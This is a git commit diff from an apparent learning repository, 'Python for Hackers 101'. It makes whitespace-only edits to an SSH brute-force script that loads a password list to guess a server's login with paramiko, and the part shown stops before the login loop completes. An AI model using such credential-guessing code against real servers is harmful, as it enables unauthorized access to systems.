2358fe7b57d9f20c5f6b7b84900c987dea876899
LionelG1995 <lionel.goveas@hotmail.com>
2024-01-13 20:12:33 +1030

    Completed SSH Brute Force Python File

--- Python for Hackers 101/brute-ssh.py
+++ Python for Hackers 101/brute-ssh.py
@@ -1,11 +1,11 @@
 from pwn import *
 import paramiko
 
-host="127.0.0.1" # change this to the host you want to brute force
-username = "username" # change this to the username you want to brute force
+host="127.0.0.1"  # change this to the host you want to brute force
+username = "username"  # change this to the username you want to brute force
 attempts = 0
 
-with open("ssh-common-password.txt", "r") as password_list: # change this to the path of your password list
+with open("ssh-common-password.txt", "r") as password_list:  # change this to the path of your password list
     for password in password_list:
         password = password.strip("\n")
         try:
